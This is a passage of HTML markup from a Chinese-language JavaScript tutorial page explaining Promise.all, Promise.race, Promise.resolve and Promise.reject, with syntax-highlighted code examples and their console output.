class=\"token punctuation\">(</span><span class=\"token string\">'p2-ok'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> p3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> <span class=\"token number\">3000</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'p3-ok'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> p4 <span class=\"token operator\">=</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p4-err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p1<span class=\"token punctuation\">,</span> p2<span class=\"token punctuation\">,</span> p3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolves</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n      resolves<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n          console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//p1-ok   p2-ok  p3-ok</span>\n      <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p1<span class=\"token punctuation\">,</span> p2<span class=\"token punctuation\">,</span> p3<span class=\"token punctuation\">,</span> p4<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ok'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//p4-err</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ol>\n<p><strong>Promise.race(iterable)</strong></p>\n<ol>\n<li><p>语法<br><code>var p = Promise.race([p1, p2, p3]);</code></p>\n</li>\n<li><p>含义<br><code>Promise.race</code>方法同样是将多个<code>Promise</code>实例，包装成一个新的<code>Promise</code>实例。只要<code>p1</code>、<code>p2</code>、<code>p3</code>之中有一个实例率先改变状态，<code>p</code>的状态就跟着改变。那个率先改变的 <code>Promise</code> 实例的返回值，就传递给<code>p</code>的回调函数。<br><code>Promise.race</code>方法的参数与<code>Promise.all</code>方法一样，如果不是 <code>Promise</code> 实例，就会先调用下面讲到的<code>Promise.resolve</code>方法，将参数转为<code>Promise</code>实例，再进一步处理。</p>\n</li>\n<li><p>用法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> p1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"one\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> p2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"two\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">race</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p1<span class=\"token punctuation\">,</span> p2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"two\"</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> p3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> p4 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>reject<span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"four\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">race</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p3<span class=\"token punctuation\">,</span> p4<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"three\"</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 未被调用  </span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> p5 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"five\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> p6 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n          <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>reject<span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"six\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">race</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p5<span class=\"token punctuation\">,</span> p6<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token comment\">// 未被调用             </span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">reason</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>reason<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"six\"</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ol>\n<p><strong>Promise.resolve(value)</strong></p>\n<ol>\n<li><p>语法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">Promise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>promise<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>thenable<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><code>Promise.resolve</code>等价于下面的写法。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">Promise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 等价于</span>\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>含义<br>返回一个状态由给定<code>value</code>决定的<code>Promise</code>实例。</p>\n</li>\n<li><p>用法<br>(1) 如果该值是一个<code>Promise</code>对象，则直接返回该对象；</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> p2 <span class=\"token operator\">=</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">===</span> p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//true</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>(2) 如果参数是<code>thenable</code>对象(即带有<code>then</code>方法的对象)，则返回的<code>Promise</code>对象的最终状态由<code>then</code>方法的执行决定；</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> thenable <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token number\">42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>thenable<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 42</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>(3) 如果参数是不具有<code>then</code>方法的对象或基本数据类型，则返回的<code>Promise</code>对象的状态为<code>fulfilled</code>，并且将该参数传递给<code>then</code>方法。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">Promise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Hello'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//Hello</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>(4) 如果不带有任何参数，则返回的<code>Promise</code>对象的状态为<code>fulfilled</code>，并且将<code>undefined</code>作为参数传递给<code>then</code>方法。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">Promise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//undefined</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>通常而言，如果你不知道一个值是否是<code>Promise</code>对象，使用<code>Promise.resolve(value)</code> 来返回一个<code>Promise</code>对象,这样就能将该<code>value</code>以<code>Promise</code>对象形式使用。</p>\n</li>\n<li><p>立即<code>resolve</code>的<code>Promise</code>对象，是在本轮“事件循环”（<code>event loop</code>）的结束时，而不是在下一轮“事件循环”的开始时。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'three'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'two'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'one'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// one </span>\n<span class=\"token comment\">// two</span>\n<span class=\"token comment\">// three</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ol>\n<p><strong>Promise.reject(reason)</strong></p>\n<ol>\n<li><p>语法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">Promise<span class=\"token punctuation\">.</span><span class=\"token function\">reject</span><span class=\"token punctuation\">(</span>reason<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>Promise.reject</code>等价于下面的写法。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">reject</span><span class=\"token punctuation\">(</span>reason<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 等同于</span>\n<span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span>reason<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>含义<br>返回一个状态为<code>rejected</code>的<code>Promise</code>对象，并将给定的失败信息传递给对应的处理方法。</p>\n</li>\n</ol>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><strong>注意：<code>Promise.resolve(value)</code>方法返回的<code>Promise</code>实例的状态由<code>value</code>决定，可能是<code>fulfilled</code>，也可能是<code>rejected</code>。<code>Promise.reject(reason)</code>方法返回的<code>Promise</code>实例的状态一定是<code>rejected</code>。</strong></p></blockquote>\n<ol>\n<li><p>用法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">Promise<span class=\"token punctuation\">.</span><span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Testing static reject\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 未被调用</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">reason</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>reason<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Testing static reject</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fail\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 未被调用</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Error: fail</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p><code>Promise.reject()</code>方法的参数，会原封不动地作为<code>reject</code>的理由，变成后续方法的参数。这一点与<code>Promise.resolve</code>方法不一致。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> thenable <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ok'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>thenable<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>e <span class=\"token operator\">===</span> <span class=\"token string\">'ok'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//true</span>\n    <span class=\"token 